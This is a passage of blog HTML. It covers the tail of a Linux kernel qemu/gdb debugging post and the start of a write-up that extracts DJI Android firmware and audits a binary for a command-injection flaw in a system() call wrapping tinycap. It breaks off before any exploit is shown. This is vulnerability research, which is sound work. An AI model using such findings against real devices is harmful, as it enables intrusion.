class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs 1c">uubb@uubb-ThinkCentre-M930s-N000 <span class="hljs-symbol">~/k/linux-5.10&gt; </span><br><span class="hljs-symbol">sudo qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage \</span><br><span class="hljs-symbol">-drive file=xenial-debootstrap.ext2.qcow2 \</span><br><span class="hljs-symbol">-net nic -net user,hostfwd=tcp</span>::<span class="hljs-number">2222</span>-:<span class="hljs-number">22</span>,hostfwd=tcp::<span class="hljs-number">9999</span>-:<span class="hljs-number">9999</span>,hostfwd=tcp::<span class="hljs-number">8000</span>-:<span class="hljs-number">8000</span> \<br>-nographic -append <span class="hljs-string">&quot;root=/dev/sda console=ttyS0&quot;</span> -s -S <br>qemu-system-x86_64: warning: TCG doesn&#x27;t support requested feature: CPUID.01H:ECX.vmx [bit 5]<br>[    0.<span class="hljs-number">000000</span>] Linux version 5.10.0 (uubb@uubb-ThinkCentre-M930s-N000) (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0, GNU ld (GNU Binutils for Ubuntu) 2.30) #1 SMP Tue Jan 16 16:59:56 CST <span class="hljs-number">2024</span><br>[    0.<span class="hljs-number">000000</span>] Command line: root=/dev/sda console=ttyS0<br>[    0.<span class="hljs-number">000000</span>] x86/fpu: x87 FPU will use FXSAVE<br>[    0.<span class="hljs-number">000000</span>] BIOS-provided physical RAM map:<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000000000</span>00-0x<span class="hljs-number">000000000009</span>fbff] usable<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">000000000009</span>fc00-0x<span class="hljs-number">000000000009</span>ffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">0000000000</span>0f<span class="hljs-number">0000</span>-0x<span class="hljs-number">0000000000</span>0fffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000001000</span>00-0x<span class="hljs-number">0000000007</span>fdffff] usable<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">0000000007</span>fe<span class="hljs-number">0000</span>-0x<span class="hljs-number">0000000007</span>ffffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000</span>fffc<span class="hljs-number">0000</span>-0x<span class="hljs-number">00000000</span>ffffffff] reserved<br>[    0.<span class="hljs-number">000000</span>] NX (Execute Disable) protection: active<br>[    0.<span class="hljs-number">000000</span>] SMBIOS 2.8 present.<br>[    0.<span class="hljs-number">000000</span>] DMI: QEMU Standard PC (i440FX + PIIX, <span class="hljs-number">1996</span>), BIOS 1.10.2-1ubuntu1 04/01/<span class="hljs-number">2014</span><br>...<br>[    1.<span class="hljs-number">310874</span>] Call Trace:<br>[    1.<span class="hljs-number">311062</span>]  dump_stack+0x57/0x6a<br>[    1.<span class="hljs-number">311273</span>]  panic+0xf6/0x2b7<br>[    1.<span class="hljs-number">311466</span>]  mount_block_root+0x1de/0x20a<br>[    1.<span class="hljs-number">311725</span>]  ? __SCT__tp_func_drv_hw_scan+0x8/0x8<br>[    1.<span class="hljs-number">312009</span>]  ? rdinit_setup+0x26/0x26<br>[    1.<span class="hljs-number">312229</span>]  mount_root+0xec/0x10a<br>[    1.<span class="hljs-number">312436</span>]  prepare_namespace+0x130/0x15f<br>[    1.<span class="hljs-number">312685</span>]  kernel_init_freeable+0x1e4/0x1f4<br>[    1.<span class="hljs-number">312947</span>]  ? rest_init+0xaf/0xaf<br>[    1.<span class="hljs-number">313155</span>]  kernel_init+0x5/0xfa<br>[    1.<span class="hljs-number">313362</span>]  ret_from_fork+0x22/0x30<br>[    1.<span class="hljs-number">313709</span>] Kernel Offset: 0x<span class="hljs-number">22400000</span> from 0xffffffff<span class="hljs-number">81000000</span> (relocation range: 0xffffffff<span class="hljs-number">80000000</span>-0xffffffffbfffffff)<br>[    1.<span class="hljs-number">314349</span>] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(8,0) ]---<br><br></code></pre></td></tr></table></figure><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2010-46-56%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><p>然后gdb 选择vmlinux 即可进行调试。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs stata">uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux-5.10&gt; <br>uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux-5.10&gt; gdb vmlinux<br>GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1<br><span class="hljs-keyword">Copyright</span> (C) 2018 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL <span class="hljs-keyword">version</span> 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is free software: you are free to change and redistribute it.<br>There is <span class="hljs-keyword">NO</span> WARRANTY, to the extent permitted <span class="hljs-keyword">by</span> law.  <span class="hljs-keyword">Type</span> <span class="hljs-string">&quot;show copying&quot;</span><br>and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.<br><span class="hljs-keyword">Type</span> <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.<br><span class="hljs-keyword">For</span> bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">help</span>, <span class="hljs-keyword">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br><span class="hljs-keyword">Type</span> <span class="hljs-string">&quot;apropos word&quot;</span> to <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>...<br>Reading symbols from vmlinux...done.<br>warning: <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;/home/uubb/kernel_Linux/linux-5.10/scripts/gdb/vmlinux-gdb.py&quot;</span> auto-loading has been declined <span class="hljs-keyword">by</span> your `auto-load safe-path&#x27; <span class="hljs-keyword">set</span> to <span class="hljs-string">&quot;$debugdir:$datadir/auto-load&quot;</span>.<br>To enable execution of this <span class="hljs-keyword">file</span> add<br>add-auto-load-safe-path /home/uubb/kernel_Linux/linux-5.10/scripts/gdb/vmlinux-gdb.py<br><span class="hljs-keyword">line</span> to your configuration <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;/home/uubb/.gdbinit&quot;</span>.<br>To completely disable this security protection add<br><span class="hljs-keyword">set</span> auto-load safe-path /<br><span class="hljs-keyword">line</span> to your configuration <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;/home/uubb/.gdbinit&quot;</span>.<br><span class="hljs-keyword">For</span> <span class="hljs-keyword">more</span> information <span class="hljs-keyword">about</span> this security protection see the<br><span class="hljs-string">&quot;Auto-loading safe path&quot;</span> section <span class="hljs-keyword">in</span> the GDB manual.  <span class="hljs-keyword">E</span>.<span class="hljs-keyword">g</span>., <span class="hljs-keyword">run</span> from the <span class="hljs-keyword">shell</span>:<br>---<span class="hljs-keyword">Type</span> &lt;<span class="hljs-keyword">return</span>&gt; to <span class="hljs-keyword">continue</span>, or q &lt;<span class="hljs-keyword">return</span>&gt; to quit---<br>info <span class="hljs-string">&quot;(gdb)Auto-loading safe path&quot;</span><br>(gdb) target remote localhost:1234<br>Remote debugging using localhost:1234<br>0x000000000000fff0 <span class="hljs-keyword">in</span> exception_stacks ()<br>(gdb) <br>(gdb) <br>(gdb) b start_kernel<br>Breakpoint 1 at 0xffffffff82b1dadb: <span class="hljs-keyword">file</span> init/main.c, <span class="hljs-keyword">line</span> 849.<br>(gdb) c<br>Continuing.<br><br>Breakpoint 1, start_kernel () at init/main.c:849<br>849&#123;<br>(gdb) <br>Continuing.<br>(gdb) <br><br></code></pre></td></tr></table></figure><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2010-45-17%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>dajiang_Android固件分析&amp;漏洞审计</title>
    <link href="/2024/04/06/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2024/04/06/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在开发复杂的Android 应用程序时，service 工具可以用于ADB shell 中通过命令行与Binder 进行交互。使用service list 可以看到设备内所有使用Binder 的服务。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rm500</span>:/ $ service list | grep -i dji<br><span class="hljs-attribute">0</span>   DJIBaseService:<span class="hljs-meta"> []</span><br><span class="hljs-attribute">1</span>   DJIService:<span class="hljs-meta"> []</span><br><span class="hljs-attribute">83</span>  protocol:<span class="hljs-meta"> [com.dji.protocol.IProtocolManager]</span><br><span class="hljs-attribute">84</span>  report:<span class="hljs-meta"> [com.dji.report.IReportManager]</span><br><span class="hljs-attribute">108</span> djilink:<span class="hljs-meta"> [djilink]</span><br></code></pre></td></tr></table></figure><h2 id="升级包分析与提取"><a href="#升级包分析与提取" class="headerlink" title="升级包分析与提取"></a>升级包分析与提取</h2><p>查看固件的格式，可以看到是POSIX tar 的格式。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240331220421670.png"><br>这种格式的文件可以使用tar进行解压和提取<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240331220610808.png"><br>所以需要更改bin包的拓展名为 .tar 。</p><p>使用 “tar -xvf” 进行解压之后，可以看到 “ rm500_0205_v00.00.11.98_20221031.pro.fw.sig “ 这个文件特别大，那么文件系统就在这里面了，因为下载下来的固件的大小大约也是1.7G。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240331220834010.png"><br>使用binwalk 查看文件的格式，由于固件太大， 所以binwalk 输出了很多信息，这里摘出部分固件描述的信息，可以看到大部分的内容是zip格式的压缩格式，并且从输出的信息来看，这就可能是android 固件中的内容，并且由于下载的这个固件是更新包，所以里面有很多app 的res 资源还有assets资源，也有boot.img 以及 recovery.img 等镜像文件。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">tigerortiger@ubuntu ~/i/g/daji&gt; binwalk rm500_0205_v00.<span class="hljs-number">00</span>.<span class="hljs-number">11</span>.<span class="hljs-number">98_20221031</span>.pro.fw.sig <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br><span class="hljs-number">480</span>           <span class="hljs-number">0</span>x1E0           Zip archive data, at least v1.<span class="hljs-number">0</span> to extract, name: system.patch.dat<br><span class="hljs-number">530</span>           <span class="hljs-number">0</span>x212           Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/com/android/metadata<br><span class="hljs-number">732</span>           <span class="hljs-number">0</span>x2DC           Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/com/google/android/update-binary<br><span class="hljs-number">649999</span>        <span class="hljs-number">0</span>x9EB0F         Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/com/google/android/updater-script<br><span class="hljs-number">650625</span>        <span class="hljs-number">0</span>x9ED81         Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: boot.img<br><span class="hljs-number">9498728</span>       <span class="hljs-number">0x90F068</span>        Uncompressed Adobe Flash SWF file, Version <span class="hljs-number">114</span>, File size (header included) <span class="hljs-number">692802466</span><br><span class="hljs-number">10233785</span>      <span class="hljs-number">0x9C27B9</span>        Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: file_contexts.bin<br><span class="hljs-number">10247149</span>      <span class="hljs-number">0</span>x9C5BED        Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: recovery-two-step.img<br><span class="hljs-number">31555539</span>      <span class="hljs-number">0</span>x1E17FD3       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: recovery.img<br><span class="hljs-number">52863920</span>      <span class="hljs-number">0</span>x<span class="hljs-number">326A3B0</span>       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: system.new.dat<br><span class="hljs-number">56087091</span>      <span class="hljs-number">0x357D233</span>       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/MANIFEST.MF<br><span class="hljs-number">56113592</span>      <span class="hljs-number">0x35839B8</span>       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">56708341</span>      <span class="hljs-number">0</span>x3614CF5       EBML file<br><span class="hljs-number">98144163</span>      <span class="hljs-number">0</span>x5D98FA3       gzip compressed data, ASCII, has header CRC, has <span class="hljs-number">31868</span> bytes of extra data, has comment, last modified: <span class="hljs-number">2064-08-07</span> <span class="hljs-number">20</span>:<span class="hljs-number">10</span>:<span class="hljs-number">06</span> (bogus date)<br><span class="hljs-number">145862879</span>     <span class="hljs-number">0</span>x8B1B0DF       Uncompressed Adobe Flash SWF file, Version <span class="hljs-number">107</span>, File size (header included) <span class="hljs-number">284564009</span><br><span class="hljs-number">161917216</span>     <span class="hljs-number">0</span>x<span class="hljs-number">9A6A920</span>       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">179573643</span>     <span class="hljs-number">0</span>xAB4138B       Uncompressed Adobe Flash SWF file, Version <span class="hljs-number">110</span>, File size (header included) <span class="hljs-number">1268045105</span><br><span class="hljs-number">201947399</span>     <span class="hljs-number">0</span>xC097907       MySQL MISAM index file Version <span class="hljs-number">10</span><br><span class="hljs-number">246485837</span>     <span class="hljs-number">0</span>xEB1134D       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">255492818</span>     <span class="hljs-number">0</span>xF3A82D2       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">262679943</span>     <span class="hljs-number">0</span>xFA82D87       Cisco IOS microcode, for &quot;p&quot;<br><span class="hljs-number">267586642</span>     <span class="hljs-number">0</span>xFF30C52       Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">273966908</span>     <span class="hljs-number">0</span>x1054673C      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, compressed size: <span class="hljs-number">27758</span>, uncompressed size: <span class="hljs-number">78957</span>, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">273994717</span>     <span class="hljs-number">0</span>x1054D3DD      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, compressed size: <span class="hljs-number">27612</span>, uncompressed size: <span class="hljs-number">78920</span>, name: META-INF/MANIFEST.MF<br><span class="hljs-number">280188038</span>     <span class="hljs-number">0x10B35486</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, compressed size: <span class="hljs-number">3298856</span>, uncompressed size: <span class="hljs-number">7852016</span>, name: classes13.dex<br><span class="hljs-number">283507087</span>     <span class="hljs-number">0</span>x10E5F98F      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, compressed size: <span class="hljs-number">16099</span>, uncompressed size: <span class="hljs-number">33924</span>, name: classes4.dex<br><span class="hljs-number">286805548</span>     <span class="hljs-number">0</span>x11184E2C      Zip archive data, v0.<span class="hljs-number">0</span> compressed size: <span class="hljs-number">422712</span>, uncompressed size: <span class="hljs-number">422712</span>, name: res/drawable-xxhdpi-v4/launcher_main_page_background_2.webp<br>...<br><span class="hljs-number">1644421087</span>    <span class="hljs-number">0</span>x6203DFDF      MySQL ISAM compressed data file Version <span class="hljs-number">11</span><br><span class="hljs-number">1651965902</span>    <span class="hljs-number">0</span>x6276FFCE      EBML file<br><span class="hljs-number">1677644302</span>    <span class="hljs-number">0</span>x63FED20E      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/MANIFEST.MF<br><span class="hljs-number">1677703331</span>    <span class="hljs-number">0</span>x63FFB8A3      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">1725958571</span>    <span class="hljs-number">0</span>x66E009AB      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: system.transfer.list<br><span class="hljs-number">1725993955</span>    <span class="hljs-number">0</span>x<span class="hljs-number">66E093E3</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: trust.img<br><span class="hljs-number">1726425542</span>    <span class="hljs-number">0</span>x<span class="hljs-number">66E729C6</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: uboot.img<br><span class="hljs-number">1727213555</span>    <span class="hljs-number">0</span>x66F32FF3      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/com/android/otacert<br><span class="hljs-number">1727214531</span>    <span class="hljs-number">0</span>x<span class="hljs-number">66F333C3</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/MANIFEST.MF<br><span class="hljs-number">1727215273</span>    <span class="hljs-number">0</span>x<span class="hljs-number">66F336A9</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.SF<br><span class="hljs-number">1727216088</span>    <span class="hljs-number">0</span>x<span class="hljs-number">66F339D8</span>      Zip archive data, at least v2.<span class="hljs-number">0</span> to extract, name: META-INF/<span class="hljs-keyword">CERT</span>.RSA<br></code></pre></td></tr></table></figure><p>所以可以直接使用unzip 进行解压，解压的前提是重命名为zip 拓展名便于unzip识别。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dts">tigerortiger@ubuntu ~<span class="hljs-keyword">/i/</span>g/daji&gt; unzip rm500_0205_v00<span class="hljs-number">.00</span><span class="hljs-number">.11</span><span class="hljs-number">.98</span>_20221031.pro.fw.sig.zip <br><span class="hljs-symbol">Archive:</span>  rm500_0205_v00<span class="hljs-number">.00</span><span class="hljs-number">.11</span><span class="hljs-number">.98</span>_20221031.pro.fw.sig.zip<br>signed by SignApk<br>warning [rm500_0205_v00<span class="hljs-number">.00</span><span class="hljs-number">.11</span><span class="hljs-number">.98</span>_20221031.pro.fw.sig.zip]:  <span class="hljs-number">480</span> extra bytes at beginning or within zipfile<br>  (attempting to process anyway)<br><span class="hljs-symbol"> extracting:</span> system.patch.dat        <br><span class="hljs-symbol">  inflating:</span> META-INF<span class="hljs-keyword">/com/</span>android/metadata  <br><span class="hljs-symbol">  inflating:</span> META-INF<span class="hljs-keyword">/com/</span>google<span class="hljs-keyword">/android/</span>update-binary  <br><span class="hljs-symbol">  inflating:</span> META-INF<span class="hljs-keyword">/com/</span>google<span class="hljs-keyword">/android/</span>updater-script  <br><span class="hljs-symbol">  inflating:</span> boot.img                <br><span class="hljs-symbol">  inflating:</span> file_contexts.bin       <br><span class="hljs-symbol">  inflating:</span> recovery-two-step.img   <br><span class="hljs-symbol">  inflating:</span> recovery.img            <br><span class="hljs-symbol">  inflating:</span> system.new.dat          <br><span class="hljs-symbol">  inflating:</span> system.transfer.list    <br><span class="hljs-symbol">  inflating:</span> trust.img               <br><span class="hljs-symbol">  inflating:</span> uboot.img               <br><span class="hljs-symbol">  inflating:</span> META-INF<span class="hljs-keyword">/com/</span>android/otacert  <br><span class="hljs-symbol">  inflating:</span> META-INF/MANIFEST.MF    <br><span class="hljs-symbol">  inflating:</span> META-INF/CERT.SF        <br><span class="hljs-symbol">  inflating:</span> META-INF/CERT.RSA   <br></code></pre></td></tr></table></figure><p>根据解压出来的信息，并且固件是升级包，因此大量的文件系统应该在system.new.dat 内，这个文件在Android 升级包中，用于描述系统分区更新的内容，通常和 system.transfer.list 和 system.patch.dat 一起使用，共同描述系统分区的更新内容和差异，从Android 5.0 开始，Google 采用了新的打包方式，不再提供system.img文件，而是通过system.new.dat 等文件实现更新。<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240331223349692.png"></p><p>system.new.dat 实际上是由system.transfer.list 描述的稀疏数组，需要使用特定的工具 sdat2img 转换成可挂载的 ext4 image 文件。对于想要自定义或修改ROM的用户来说，理解这些文件的作用和使用相应的工具进行操作是非常重要的。例如，使用sdat2img工具可以将system.new.dat文件转换为system.img，这样就可以对其进行修改或定制。</p><p>有关sdat2img 的信息： <a href="https://github.com/xpirt/sdat2img">https://github.com/xpirt/sdat2img</a> (将稀疏 Android 数据映像 (.dat) 转换为文件系统 ext4 映像 (.img))</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gams">tigerortiger@ubuntu ~/i/g/daji&gt; python sdat2img.py <span class="hljs-keyword">system</span>.transfer.list <span class="hljs-keyword">system</span>.new.dat <span class="hljs-keyword">system</span>.img<br>sdat2img <span class="hljs-keyword">binary</span> - version: <span class="hljs-number">1.2</span><br><br>Android Nougat <span class="hljs-number">7.</span>x / Oreo <span class="hljs-number">8.</span>x detected!<br><br><span class="hljs-function"><span class="hljs-title">Skipping</span></span> command erase...<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">1024</span> blocks into position <span class="hljs-number">0.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">683</span> blocks into position <span class="hljs-number">1024.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">143</span> blocks into position <span class="hljs-number">1708.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">198</span> blocks into position <span class="hljs-number">1852.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">639</span> blocks into position <span class="hljs-number">2050.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">163</span> blocks into position <span class="hljs-number">2690.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">185</span> blocks into position <span class="hljs-number">2854.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">37</span> blocks into position <span class="hljs-number">3040.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">295</span> blocks into position <span class="hljs-number">3077.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">208</span> blocks into position <span class="hljs-number">3373.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">9</span> blocks into position <span class="hljs-number">3582.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">111</span> blocks into position <span class="hljs-number">3592.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">70</span> blocks into position <span class="hljs-number">3704.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">4</span> blocks into position <span class="hljs-number">3775.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">1</span> blocks into position <span class="hljs-number">3780.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">1</span> blocks into position <span class="hljs-number">3782.</span>..<br><span class="hljs-function"><span class="hljs-title">Copying</span></span> <span class="hljs-number">1</span> blocks into position <span class="hljs-number">3784.</span>..<br>...&lt;snip&gt;<br><span class="hljs-function"><span class="hljs-title">Skipping</span></span> command zero...<br>Done! Output image: /home/tigerortiger/iot/gujian/daji/<span class="hljs-keyword">system</span>.img<br></code></pre></td></tr></table></figure><p>然后就可以直接挂载到对应的目录下了<br><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240331225254111.png"></p><p>在 bin 目录下看到这个文件。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">tigerortiger<span class="hljs-variable">@ubuntu</span> ~<span class="hljs-regexp">/i/g</span><span class="hljs-regexp">/d/m</span><span class="hljs-regexp">/bin&gt; file djilink </span><br><span class="hljs-regexp">djilink: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /system</span><span class="hljs-regexp">/bin/linker</span>64, BuildID[md5/uuid]=<span class="hljs-number">0</span>c5df7117f458b98492c5445bb629362, stripped<br></code></pre></td></tr></table></figure><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="tinycap-setMicStatus"><a href="#tinycap-setMicStatus" class="headerlink" title="tinycap &amp; setMicStatus"></a>tinycap &amp; setMicStatus</h3><p>sub_1B3D4() 函数中可以看到格式化字符串然后调用 system函数来执行，其中的 tinycap  可执行文件在 &#x2F;bin&#x2F;tinycap ，而这个可执行文件主要用于调试录音功能，比如使用命令 “tinycap &#x2F;sdcard&#x2F;test.pcm -D 0 -d 0 -c 4 -r 48000 -b 32 -p 768 -n 10” 是用于指定各种参数然后保存到&#x2F;sdcard&#x2F;test.pcm 中。但看从下面的代码中可以判断其中存在命令拼接执行的问题。</p><p><img src="/73__dajiang__Android%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90.assets/image-20240401111042825.png"><br>sub_1B3D4()  这个函数在 sub_4A9E4() 进行调用，根据log_print 大概知道这是一个 测试的功能。<br><img 